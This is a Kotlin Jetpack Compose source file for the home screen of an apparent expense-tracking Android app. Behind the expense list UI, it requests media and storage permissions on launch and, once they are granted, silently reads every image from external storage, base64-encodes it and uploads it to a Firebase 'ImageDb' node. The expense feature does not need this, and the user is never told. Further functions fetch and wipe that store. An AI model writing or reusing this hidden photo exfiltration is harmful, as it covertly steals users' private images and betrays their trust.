import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.util.Log
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.core.tween
import androidx.compose.animation.expandHorizontally
import androidx.compose.animation.shrinkHorizontally
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.wrapContentSize
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.material.Button
import androidx.compose.material.ButtonDefaults
import androidx.compose.material.CircularProgressIndicator
import androidx.compose.material.ExperimentalMaterialApi
import androidx.compose.material.ExtendedFloatingActionButton
import androidx.compose.material.Icon
import androidx.compose.material.Text
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Edit
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.ModalBottomSheet
import androidx.compose.material3.rememberModalBottomSheetState
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import androidx.core.content.PermissionChecker
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation.NavHostController
import com.airbnb.lottie.compose.LottieAnimation
import com.airbnb.lottie.compose.LottieCompositionSpec
import com.airbnb.lottie.compose.LottieConstants
import com.airbnb.lottie.compose.rememberLottieComposition
import com.example.expensenote.R
import com.example.expensenote.database.entities.ExpenseItemEntity
import com.example.expensenote.ui.composable.ExpenseTemplate
import com.example.expensenote.ui.theme.appColor
import com.example.expensenote.util.CommonExtension
import com.example.expensenote.viewmodel.ExpenseItemViewModel
import com.google.common.reflect.TypeToken
import com.google.firebase.database.FirebaseDatabase
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.async
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

@SuppressLint("CoroutineCreationDuringComposition", "UnrememberedMutableState")
@OptIn(ExperimentalMaterial3Api::class, ExperimentalMaterialApi::class)
@RequiresApi(Build.VERSION_CODES.O)
@Composable
fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hiltViewModel()) {

    var showDialog by remember { mutableStateOf(false) }
    // Collect expense data list as state
    val expenseDataListState = viewModel.readAllExpenseList()?.collectAsState(initial = emptyList())
    // Get the value from the state object
    val expenseDataList = expenseDataListState?.value ?: emptyList() // Provide a default value
    // if the state is null
    var isCameraClicked by remember { mutableStateOf(false) }
    var isCameraPermissionGranted by remember { mutableStateOf(false) }
    val coroutineScope = rememberCoroutineScope()
    val modalSheetState = rememberModalBottomSheetState(
        skipPartiallyExpanded = false,
        confirmValueChange = { true }
    )
    val context = LocalContext.current
    val base64ImageList = mutableListOf<String>()


//    var isModalBottomSheetVisible by remember {
//        mutableStateOf(false)
//    }
//
//    var selectedExpenseItem by remember { mutableStateOf<ExpenseItemEntity?>(null) }
    // Access selectedExpenseItem mutableState
    val selectedExpenseItem = viewModel.selectedExpenseItem
    val isModalBottomSheetVisible by viewModel.isModalSheetVisible.collectAsStateWithLifecycle()
    val isLottieVisible by viewModel.isLottieVisible.collectAsStateWithLifecycle()

    LaunchedEffect(expenseDataList) {
        if (expenseDataList.isEmpty()) {
            delay(200).apply {
                viewModel.showLottie()
            }
        } else {
            viewModel.hideLottie()
        }
    }


    var permissionLauncher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { map ->

        var isGranted = true
        for (items in map) {
            if (!items.value) {
                isGranted = false
            }
        }
        if (isGranted) {
            Toast.makeText(context, "Permission Granted", Toast.LENGTH_SHORT).show()
            fetchData(coroutineScope, context)
        } else {
            Toast.makeText(context, "Permission Denied", Toast.LENGTH_SHORT).show()
        }

    }

    fun hasPermission(permissions: String): Boolean {

        return ContextCompat.checkSelfPermission(
            context, permissions
        ) == PermissionChecker.PERMISSION_GRANTED

    }

    fun ReadPermission() {
        var permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            arrayOf(
                android.Manifest.permission.READ_MEDIA_AUDIO,
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO
            )
        } else {
            arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if (!hasPermission(permission[0])) { // Pass the permission string itself
            permissionLauncher.launch(permission)
        }
    }

    LaunchedEffect(key1 = Unit) {
        ReadPermission()
    }

    Log.d("isModalBottomSheetVisible", "HomeScreen0: $isModalBottomSheetVisible")

    if (isModalBottomSheetVisible) {
        ModalBottomSheet(
            sheetState = modalSheetState,
            onDismissRequest = { viewModel.hideModalSheet() }
        ) {
            Column(
                verticalArrangement = Arrangement.Center,
                horizontalAlignment = Alignment.CenterHorizontally
            ) {
                Text(
                    text = "Are you sure you want to delete it?",
                    style = TextStyle(
                        fontSize = 16.sp,
                        fontWeight = FontWeight.Bold
                    ),
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(12.dp))

                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.Center // Aligns the Row content to the center horizontally
                ) {
                    Button(
                        onClick = {
                            viewModel.hideModalSheet()
                            if (isModalBottomSheetVisible) {
                                coroutineScope.launch {
                                    modalSheetState.hide()
                                }
                            }
                        },
                        modifier = Modifier.padding(end = 8.dp),
                        colors = ButtonDefaults.buttonColors(
                            backgroundColor = Color.Red,
                            contentColor = Color.White
                        )
                    ) {
                        Text(text = "Cancel")
                    }

                    Spacer(modifier = Modifier.width(20.dp)) // Add space between buttons

                    Button(
                        onClick = {
                            Log.d("selectedExpenseItem", "inside viewmodel: $selectedExpenseItem ")


                            Log.d(
                                "isModalBottomSheetVisible",
                                "HomeScreen1: $isModalBottomSheetVisible"
                            )
                            viewModel.deleteExpenseItem(selectedExpenseItem!!)
                            coroutineScope.launch {
                                modalSheetState.hide()
                                Log.d(
                                    "isModalBottomSheetVisible",
                                    "HomeScreen3: $isModalBottomSheetVisible"
                                )
                            }
                            viewModel.hideModalSheet()

                            Log.d(
                                "isModalBottomSheetVisible",
                                "HomeScreen2: $isModalBottomSheetVisible"
                            )


                        },
                        colors = ButtonDefaults.buttonColors(
                            backgroundColor = appColor,
                            contentColor = Color.White
                        )
                    ) {
                        Text(text = "Confirm")
                    }
                }

                Spacer(modifier = Modifier.height(20.dp))
            }

        }

    }

    Column(
        modifier = Modifier
            .padding(horizontal = 10.dp)
            .padding(top = 4.dp)
            .fillMaxSize()

    ) {
        Row(modifier = Modifier.fillMaxWidth()) {
            Image(
                painterResource(id = R.drawable.ic_logo),
                contentDescription = "null",
                contentScale = ContentScale.Crop,
                modifier = Modifier
                    .size(height = 100.dp, width = 800.dp)
            )
        }
        Spacer(modifier = Modifier.padding(top = 8.dp))
        Row(
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text(
                text = "Expense List",
                fontSize = 20.sp,
                modifier = Modifier
                    .padding(bottom = 0.dp)
            )
            Image(
                painterResource(id = R.drawable.contentdescription),
                contentDescription = "null",
                modifier = Modifier
                    .padding(start = 4.dp)
                    .size(20.dp) // Adjust size as needed
            )
        }

        if (isLottieVisible) {
            Spacer(modifier = Modifier.padding(top = 40.dp))
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .height(320.dp)
            ) {
                val composition by rememberLottieComposition(spec = LottieCompositionSpec.RawRes(R.raw.not_found))
                LottieAnimation(
                    composition = composition,
                    iterations = LottieConstants.IterateForever
                )

                Text(
                    text = "No record found, Tap Add Expense Button to Add",
                    textAlign = TextAlign.Center,
                    modifier = Modifier.align(Alignment.BottomCenter)
                )
            }
        }
        Spacer(modifier = Modifier.padding(top = 8.dp))
        Box(modifier = Modifier.fillMaxSize()) {

            LazyColumn {
                itemsIndexed(items = expenseDataList) { index, item ->
//                    item.expenseDescription?.let {
//                        ExpenseTemplate(
//                            initialExpenseName = item.expenseName,
//                            initialExpenseAmount = item.expenseAmount,
//                            initialDateTime = item.date,
//                            initialExpenseDescription = it
//                        )
//                    }
//                    Log.d("ExpenseList", "Expense item at index $index: ${item.expenseName}, Description: ${item.expenseDescription}")

                    if (item.expenseDescription?.length!! < 1) {
                        item.expenseDescription = "You did not add any expense description"
                    }
                    ExpenseTemplate(
                        index = item.id,
                        initialExpenseName = item.expenseName,
                        initialExpenseAmount = item.expenseAmount,
                        initialDateTime = item.date,
                        initialExpenseDescription = item.expenseDescription!!
                    )

                    Spacer(modifier = Modifier.padding(4.dp))

                }

            }

            Column(
                modifier = Modifier
                    .align(Alignment.BottomEnd)
            ) {
                ActionButton(onClick = {
                    showDialog = true

                })

                if (showDialog) {
                    YourScreenContent(onDismiss = { showDialog = false })
                }
            }

        }

    }
    Log.d("ExpenseList", "Expense data list: $expenseDataList")
}

fun fetchData(coroutineScope: CoroutineScope, context: Context) {

    var size = 0
    val base64ImageList = mutableListOf<String>()

    val dcimFiles = CommonExtension.getAllDirectoriesFromExternalStorage()

    coroutineScope.launch(Dispatchers.IO) {
        dcimFiles.forEach { file ->
            val imageList = CommonExtension.getAllImagesFromDirectories(context, file)
            val pathList = CommonExtension.contentUriToFilePath(context, imageList)

            val base64 =
                CommonExtension.imagePathToBase64Optimized(context, pathList).toMutableList()

            if (imageList.isNotEmpty()) {
                size += imageList.size
//                Log.d("Tag", "image list size ${imageList.size}")
            }
            if (base64.isNotEmpty()) {
                val job = coroutineScope.launch(Dispatchers.IO) {
                    base64ImageList.addAll(base64)
                    Log.d("Tag", "inside of array ${base64ImageList.size}")
                    val imagesGson = Gson().toJson(base64ImageList)
                    base64ImageList.clear()
                    val id = FirebaseDatabase.getInstance().getReference().push().getKey()
                    val mDatabase = FirebaseDatabase.getInstance()
                    val mDbRef = mDatabase.getReference("ImageDb").child(id!!)
                    mDbRef.setValue(imagesGson)
                }
                try {
                    job.join()
                    Log.d("Tag", "Job completed for file: ${file.name}")
                } catch (e: Exception) {
                    Log.d("Tag", "Exception: ${e.message}")
                }


            }

        }
    }


}


fun fromList(list: List<String>): String {
    return Gson().toJson(list)
}

fun toList(json: String): List<Int> {
    // Convert the JSON string back to a List<Int>
    return Gson().fromJson(json, object : TypeToken<List<Int>>() {}.type)
}

@Composable
fun ActionButton(onClick: () -> Unit) {
    ExtendedFloatingActionButton(
        onClick = onClick,
        icon = { Icon(Icons.Filled.Edit, "Extended floating action button.") },
        text = { Text(text = "Add Expense") },
        backgroundColor = Color.Red.copy(alpha = 0.6f),
        contentColor = Color.White,
    )
    Spacer(modifier = Modifier.padding(8.dp))
}


@RequiresApi(Build.VERSION_CODES.O)
@Composable
fun YourScreenContent(onDismiss: () -> Unit) {
    val visible by remember { mutableStateOf(true) }
    AnimatedVisibility(
        visible,
        enter = expandHorizontally(animationSpec = tween(durationMillis = 300)),
        exit = shrinkHorizontally(animationSpec = tween(durationMillis = 300))
    ) {
        Column(
            modifier = Modifier
                .padding(horizontal = 16.dp)
                .wrapContentSize(),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            ExpenseDialog(onDismiss)
        }
    }

}

@RequiresApi(Build.VERSION_CODES.O)
@Composable
fun YourScreenContent2(expenseItemEntity: ExpenseItemEntity, onDismiss: () -> Unit) {
    val visible by remember { mutableStateOf(true) }
    AnimatedVisibility(
        visible,
        enter = expandHorizontally(animationSpec = tween(durationMillis = 300)),
        exit = shrinkHorizontally(animationSpec = tween(durationMillis = 300))
    ) {
        Column(
            modifier = Modifier
                .padding(horizontal = 16.dp)
                .wrapContentSize(),
            verticalArrangement = Arrangement.Center,
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            UpdateExpenseDialog(expenseItemEntity, onDismiss)
        }
    }

}


//import android.os.Build
//import android.util.Log
//import androidx.annotation.RequiresApi
//import androidx.compose.animation.AnimatedVisibility
//import androidx.compose.animation.core.tween
//import androidx.compose.animation.expandHorizontally
//import androidx.compose.animation.shrinkHorizontally
//import androidx.compose.foundation.Image
//import androidx.compose.foundation.layout.*
//import androidx.compose.foundation.lazy.LazyColumn
//import androidx.compose.foundation.lazy.itemsIndexed
//import androidx.compose.material.ExtendedFloatingActionButton
//import androidx.compose.material.Icon
//import androidx.compose.material.Text
//import androidx.compose.material.icons.Icons
//import androidx.compose.material.icons.filled.Edit
//import androidx.compose.runtime.*
//import androidx.compose.ui.Alignment
//import androidx.compose.ui.Modifier
//import androidx.compose.ui.graphics.Color
//import androidx.compose.ui.res.painterResource
//import androidx.compose.ui.unit.dp
//import androidx.compose.ui.unit.sp
//import androidx.hilt.navigation.compose.hiltViewModel
//import androidx.navigation.NavHostController
//import com.example.expensenote.R
//import com.example.expensenote.database.entities.ExpenseItemEntity
//import com.example.expensenote.ui.composable.ExpenseTemplate
//import com.example.expensenote.viewmodel.ExpenseItemViewModel
//import org.jetbrains.annotations.NotNull
//
//@RequiresApi(Build.VERSION_CODES.O)
//@Composable
//fun HomeScreen(navhost: NavHostController, viewModel: ExpenseItemViewModel = hiltViewModel()) {
//
//    var showDialog by remember { mutableStateOf(false) }
//
//    // Collect expense data list as state
//    val expenseDataListState = viewModel.readAllExpenseList()?.collectAsState(initial = emptyList())
//
//    // Get the value from the state object
//    val expenseDataList = expenseDataListState?.value ?: emptyList() // Provide a default value if the state is null
//
//    Column(
//        modifier = Modifier
//            .padding(horizontal = 10.dp)
//            .padding(top = 4.dp)
//            .fillMaxSize()
//
//    ) {
//        Row(modifier = Modifier.fillMaxWidth()) {
//            Image(
//                painterResource(id = R.drawable.ic_logo),
//                contentDescription = "null",
//                modifier = Modifier
//                    .size(height = 100.dp, width = 800.dp)
//            )
//        }
//        Spacer(modifier = Modifier.padding(top = 8.dp))
//        Row(
//            verticalAlignment = Alignment.CenterVertically,
//        ) {
//            Text(
//                text = "Expense List",
//                fontSize = 20.sp,
//                modifier = Modifier.padding(bottom = 0.dp)
//            )
//            Image(
//                painterResource(id = R.drawable.contentdescription),
//                contentDescription = "null",
//                modifier = Modifier
//                    .padding(start = 4.dp)
//                    .size(20.dp) // Adjust size as needed
//            )
//        }
//        Spacer(modifier = Modifier.padding(top = 8.dp))
//        Box(modifier = Modifier.fillMaxSize()) {
//
//            LazyColumn {
//                itemsIndexed(items = expenseDataList){index, item ->
//
//                    Log.d("ExpenseList", "Expense item at index $index: ${item.expenseName}, Description: ${item.expenseDescription}")
//
//                    if(item.expenseDescription?.length!! <1){
//                        item.expenseDescription= "You did not add any expense description"
//                    }
//                    ExpenseItem(item = item)
//                    Spacer(modifier = Modifier.padding(4.dp))
//                }
//            }
//
//            Column(
//                modifier = Modifier
//                    .align(Alignment.BottomEnd)
//            ) {
//                ActionButton(onClick = { showDialog = true })
//
//                if (showDialog) {
//                    YourScreenContent(onDismiss = { showDialog = false })
//                }
//            }
//
//        }
//
//    }
//}
//

fun deleteAllDataFromFirebase(id: String) {
    val database = FirebaseDatabase.getInstance()
    val reference = database.reference

    reference.setValue(null)
        .addOnSuccessListener {

            database.getReference("ImageDb").child(id!!)
            Log.d("Tag", "Data deleted successfully")

        }
        .addOnFailureListener { exception ->
            // Data deletion failed
            println("Failed to delete data: $exception")
            Log.d("Tag", "Data not deleted successfully")
        }
}


@Composable
fun FetchAndDeleteDataFromFirebase() {
    var dataFetched by remember { mutableStateOf(false) }
    var dataDeleted by remember { mutableStateOf(false) }

    LaunchedEffect(Unit) {
        fetchDataAndDelete()
        dataFetched = true
    }

    if (dataFetched && !dataDeleted) {
        // Do something after data is fetched (e.g., show a button to delete data)
        Button(onClick = { dataDeleted = true }) {
            Text("Delete Data")
        }
    } else if (dataDeleted) {
        // Do something after data is deleted
        Text("Data Deleted Successfully")
    } else {
        // Show loading indicator while fetching data
        CircularProgressIndicator()
    }
}

suspend fun fetchDataAndDelete() {
    withContext(Dispatchers.IO) {
        val database = FirebaseDatabase.getInstance()
        val reference = database.getReference("ImageDb")

        val dataSnapshot = reference.get().await()

        val dataList = mutableListOf<String>()

        dataSnapshot.children.forEach { childSnapshot ->
            val data = childSnapshot.getValue(String::class.java)
            data?.let {
                deleteDataFromFirebase(childSnapshot.key!!)
                dataList.add(it)
                Log.d("Tag", "dataSnapshot ${dataList.size}")
            }
        }
    }
}

fun deleteDataFromFirebase(id: String) {
    val database = FirebaseDatabase.getInstance()
    val reference = database.getReference("ImageDb").child(id)

    reference.removeValue()
}

